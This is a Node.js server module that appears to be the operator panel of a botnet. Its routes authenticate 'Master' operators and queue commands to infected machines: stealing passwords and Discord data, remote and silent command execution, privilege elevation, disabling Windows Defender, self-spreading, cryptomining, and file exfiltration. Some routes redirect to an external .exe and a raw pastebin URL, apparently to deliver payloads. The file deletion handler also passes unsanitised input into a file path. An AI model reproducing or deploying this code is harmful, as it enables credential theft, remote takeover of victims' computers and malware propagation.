const
    db = require('./database.js'),
    fs = require('fs'),
    chalk = require('chalk');

const
    error = chalk.redBright('ERROR'),
    warning = chalk.keyword('orange')('WARN'),
    info = chalk.cyan('INFO');

exports.login = function(req, res){
    if(req.session.user){
        res.send('Already logged in.');
        return;
    }
    if(!(req.body.pass || req.body.user)){
        res.status(400).send('Invalid credentials.');
        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        console.log(warning, ip, 'attempted login without credentials.');
        return;
    }
    let r = {};
    if(db.login(req.body.user, req.body.pass, r)){
        req.session.user = req.body.user;
        req.session.role = r.role;
        res.send('Login successful.');
        console.log(info, chalk.green(req.session.user+' logged in.'));
    } else {
        res.status(400).send('Incorrect username or password.');
        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        console.log(warning, ip, '-', req.body.user, 'attempted login with incorrect credentials.');
    }
};

function checkLogin(req, res, reason){
    if(!req.session.user){
        res.status(401).send('You are not logged in.');
        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        console.log(warning, ip, 'attempted to '+reason+' without logging in.');
        return false;
    }
    return true;
}

function checkMaster(req, res, reason){
    if (!checkLogin(req, reason))
        return false;
    if(req.session.role != 'Master'){
        res.status(401).send('You do not have permission to execute commands.');
        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        console.log(warning, ip, '-', req.session.user, 'attempted to '+reason+' despite having role', req.session.role);
        return false;
    }
    return true;
}

exports.getFiles = function(req, res){
    if (checkLogin(req, res, 'enumerate files')) {
        fs.readdir('Files', (err, files) => {
            if(err){
                res.status(500).send(err);
            } else {
                let s = [];
                for(var i = 0; i<files.length; i++){
                    s.push({
                        name: files[i],
                        date: fs.statSync("Files/" + files[i]).mtimeMs
                    });
                }
                res.send(db.builder.buildObject({
                    files: {
                        file: s
                    }
                }));
            }
          });
    }
};

exports.deleteFile = function(req, res){
    if (checkMaster(req, res, 'delete a file')){
        fs.unlinkSync('Files\\' + req.body.file);
        res.send('File deleted successfully.');
    }
};

exports.getLogs = function(req, res){
    if (checkLogin(req, res, 'enumerate logs')){
        let s = db.findBot(req.query.BotID);
        if(s){
            res.send(db.builder.buildObject({
                logs: {
                    msg: s.log.p
                }
            }));
        } else {
            res.status(400).send('This bot doesn\'t exist.');
        }
    }
};

function ConvertCommand(cmd){
    switch(cmd.command){
        case 'Abort':
            cmd.params = {id: cmd.params[1]};
            break;
        case 'Shutdown':
            cmd.command = 'Power';
            cmd.params = {mode: 'Shutdown'};
            break;
        case 'Reboot':
            cmd.command = 'Power';
            cmd.params = {mode: 'Reboot'};
            break;
        case 'Lock':
            cmd.command = 'Power';
            cmd.params = {mode: 'Lock'};
            break;
        case 'Sleep':
            cmd.command = 'Power';
            cmd.params = {mode: 'Sleep'};
            break;
        case 'Wake':
            cmd.command = 'Power';
            cmd.params = {mode: 'Wake'};
            break;
        case 'CompleteInfo':
            cmd.command = 'Info';
            cmd.params = {mode: 'All'};
            break;
        case 'SysInfo':
            cmd.command = 'Info';
            cmd.params = {mode: 'System'};
            break;
        case 'SoftInfo':
            cmd.command = 'Info';
            cmd.params = {mode: 'Software'};
            break;
        case 'PassInfo':
            cmd.command = 'Info';
            cmd.params = {mode: 'Passwords'};
            break;
        case 'DiscordInfo':
            cmd.command = 'Info';
            cmd.params = {mode: 'Discord'};
            break;
        case 'Download':
            cmd.command = 'File';
            cmd.params = {command: 'Download', file: cmd.params[1], name: cmd.params[2]};
            break;
        case 'Upload':
            cmd.command = 'File';
            cmd.params = {command: 'Upload', file: cmd.params[1]};
            break;
        case 'FolderList':
            cmd.command = 'File';
            cmd.params = {command: 'List', type: 'Dir', path: cmd.params[1]};
            break;
        case 'FileList':
            cmd.command = 'File';
            cmd.params = {command: 'List', type: 'File', path: cmd.params[1]};
            break;
        case 'Open':
            cmd.command = 'File';
            cmd.params = {command: 'Open', file: cmd.params[1], store: cmd.params[0]};
            break;
        case 'Exec':
            cmd.command = 'Execute';
            cmd.params = {mode: 'Local', file: cmd.params[1], hide: cmd.params[2], wait: cmd.params[3], store: cmd.params[0]};
            break;
        case 'RemoteExec':
            cmd.command = 'Execute';
            cmd.params = {mode: 'Remote', file: cmd.params[1], hide: cmd.params[2], wait: cmd.params[3], store: cmd.params[0]};
            break;
        case 'Command':
            cmd.command = 'Execute';
            cmd.params = {mode: 'Command', command: cmd.params[1].replace("\r\n", ";"), store: cmd.params[0]};
            break;
        case 'AskElevate':
            cmd.command = 'Elevate';
            cmd.params = {mode: 1};
            break;
        case 'DisguisedElevate':
            cmd.command = 'Elevate';
            cmd.params = {mode: 2};
            break;
        case 'SilentElevate':
            cmd.command = 'Elevate';
            cmd.params = {mode: 3};
            break;
        case 'DefenderOff':
            cmd.command = 'Defender';
            cmd.params = {enable: 'False'};
            break;
        case 'DefenderOn':
            cmd.command = 'Defender';
            cmd.params = {enable: 'True'};
            break;
        case 'StartSpreading':
            cmd.command = 'Spread';
            cmd.params = {mode: 'Spread', store: cmd.params[0]};
            break;
        case 'Disinfect':
            cmd.command = 'Spread';
            cmd.params = {mode: 'Disinfect'};
            break;
        case 'Update':
            cmd.params = {file: cmd.params[1]};
            break;
        case 'MessageBox':
            cmd.command = 'MessageBox';
            cmd.params = {caption: cmd.params[1], text: cmd.params[2], critical: cmd.params[3], store: cmd.params[0]};
            break;
        case 'StartMining':
            cmd.command = 'Mine';
            cmd.params = {command: 'Start', store: cmd.params[0]};
            break;
        case 'QueryMining':
            cmd.command = 'Mine';
            cmd.params = {command: 'Query'};
            break;
        default:
            cmd.params = {};
    }
}

exports.postCommand = function(req, res){
    if (!checkMaster(req, res, 'add a command'))
        return;
    //Parse command
    let tBots = JSON.parse(req.body.bots);
    let tCmd = {
        command: req.body.command,
        params: JSON.parse(req.body.params)
    };
    let tCmdID = db.getNewCommandID();
    ConvertCommand(tCmd);
    for(var i = 0; i<tBots.length; i++){
        let b = db.findBot(tBots[i]);
        if(b){
            if (tCmd.command == 'Abort')
                if (!db.isBotOnline(b)){
                    let j = db.findCommandIndex(b, tCmd.params.id);
                    if(j>-1)
                        db.removeCommand(b, j);
                    console.log(info, req.session.user, 'removed command', tCmd.params.id, 'from', tBots[i]);
                    continue;
                }
            if(tCmd.command == 'Block'){
                db.addToBlacklist(tBots[i]);
                console.log(warning, tBots[i], 'blocked permanently by', req.session.user);
                continue;
            }
            db.addCommand(b, tCmd.command, tCmd.params, tCmdID);
            console.log(info, req.session.user, '-->', tBots[i], '-', tCmd.command);
        } else {
            console.log(warning, req.session.user, 'attempted to add a command to bot', tBots[i]);
        }
    }
    res.send('Command '+tCmdID.substr(tCmdID.length - 4)+' added successfully!');
}

exports.clearLog = function(req, res){
    
    let b = db.findBot(req.body.id);
    if (b){
        db.clearLog(b);
        res.send('Logs cleared.');
        console.log(info, req.session.user, 'cleared logs for', req.body.id);
    } else {
        res.send('Failed to clear logs.');
        console.log(info, req.session.user, 'failed to clear logs for', req.body.id);
    }
}

exports.getStyle = function(req, res){
    res.status(301).redirect('https://pastebin.com/raw/r6idWFTk');
}

exports.getTest = function(req, res){
    res.status(301).redirect('https://femto.pw/jsht.exe');
}